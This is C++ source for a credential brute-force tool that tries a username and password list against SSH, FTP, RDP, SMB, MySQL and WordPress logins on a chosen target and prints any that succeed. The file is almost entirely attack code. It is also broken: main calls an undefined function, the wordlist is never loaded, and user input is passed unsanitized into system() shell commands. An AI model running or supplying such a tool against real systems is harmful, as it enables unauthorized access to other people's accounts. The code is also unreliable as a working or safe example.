#include <iostream>
#include <fstream>
#include <thread>
#include <vector>
#include <mutex>
#include <cstdlib>
#include <cstring>
#include <openssl/sha.h>
#include <openssl/md5.h>
#include <libssh/libssh.h>
#include <curl/curl.h>
#include <unistd.h>
#include <crypt.h>
#include <pcap.h>
#include <map>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>

std::mutex log_mutex;

void log_attempt(const std::string& attempt) {
    std::lock_guard<std::mutex> lock(log_mutex);
    std::cout << "[ATTEMPT] " << attempt << std::endl;
}

bool ssh_brute_force(const std::string& target, const std::string& username, const std::string& password) {
    ssh_session session = ssh_new();
    if (!session) return false;
    
    ssh_options_set(session, SSH_OPTIONS_HOST, target.c_str());
    ssh_options_set(session, SSH_OPTIONS_USER, username.c_str());
    
    if (ssh_connect(session) != SSH_OK) {
        ssh_free(session);
        return false;
    }
    
    if (ssh_userauth_password(session, nullptr, password.c_str()) == SSH_AUTH_SUCCESS) {
        std::cout << "[SUCCESS] SSH Login: " << username << " : " << password << std::endl;
        ssh_disconnect(session);
        ssh_free(session);
        return true;
    }
    
    ssh_disconnect(session);
    ssh_free(session);
    return false;
}

bool ftp_brute_force(const std::string& target, const std::string& username, const std::string& password) {
    CURL *curl = curl_easy_init();
    if (!curl) return false;
    
    std::string url = "ftp://" + target;
    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_USERNAME, username.c_str());
    curl_easy_setopt(curl, CURLOPT_PASSWORD, password.c_str());
    
    CURLcode res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);
    
    if (res == CURLE_OK) {
        std::cout << "[SUCCESS] FTP Login: " << username << " : " << password << std::endl;
        return true;
    }
    return false;
}

bool rdp_brute_force(const std::string& target, const std::string& username, const std::string& password) {
    std::string command = "xfreerdp /v:" + target + " /u:" + username + " /p:" + password + " /cert-ignore";
    int result = system(command.c_str());
    if (result == 0) {
        std::cout << "[SUCCESS] RDP Login: " << username << " : " << password << std::endl;
        return true;
    }
    return false;
}

bool smb_brute_force(const std::string& target, const std::string& username, const std::string& password) {
    std::string command = "smbclient -L " + target + " -U " + username + "%" + password + " --no-pass";
    int result = system(command.c_str());
    if (result == 0) {
        std::cout << "[SUCCESS] SMB Login: " << username << " : " << password << std::endl;
        return true;
    }
    return false;
}

bool mysql_brute_force(const std::string& target, const std::string& username, const std::string& password) {
    std::string command = "mysql -h " + target + " -u" + username + " -p" + password + " -e 'SHOW DATABASES;'";
    int result = system(command.c_str());
    if (result == 0) {
        std::cout << "[SUCCESS] MySQL Login: " << username << " : " << password << std::endl;
        return true;
    }
    return false;
}

bool wordpress_brute_force(const std::string& target, const std::string& username, const std::string& password) {
    std::string command = "wpscan --url " + target + " --usernames " + username + " --passwords " + password;
    int result = system(command.c_str());
    if (result == 0) {
        std::cout << "[SUCCESS] WordPress Admin Login: " << username << " : " << password << std::endl;
        return true;
    }
    return false;
}

void attack_function(const std::string& target, const std::string& username, const std::vector<std::string>& passwords, const std::string& mode) {
    for (const auto& password : passwords) {
        log_attempt("Trying " + username + " : " + password);
        if (mode == "ssh" && ssh_brute_force(target, username, password)) break;
        if (mode == "ftp" && ftp_brute_force(target, username, password)) break;
        if (mode == "rdp" && rdp_brute_force(target, username, password)) break;
        if (mode == "smb" && smb_brute_force(target, username, password)) break;
        if (mode == "mysql" && mysql_brute_force(target, username, password)) break;
        if (mode == "wordpress" && wordpress_brute_force(target, username, password)) break;
    }
}

int main(int argc, char* argv[]) {
    if (argc != 5) {
        std::cerr << "Usage: " << argv[0] << " <mode> <target> <username> <wordlist>" << std::endl;
        std::cerr << "Modes: ssh, ftp, rdp, smb, mysql, wordpress" << std::endl;
        return 1;
    }

    std::string mode = argv[1];
    std::string target = argv[2];
    std::string username = argv[3];
    std::string wordlist = argv[4];
    
    start_attack(target, username, wordlist, mode);
    return 0;
}
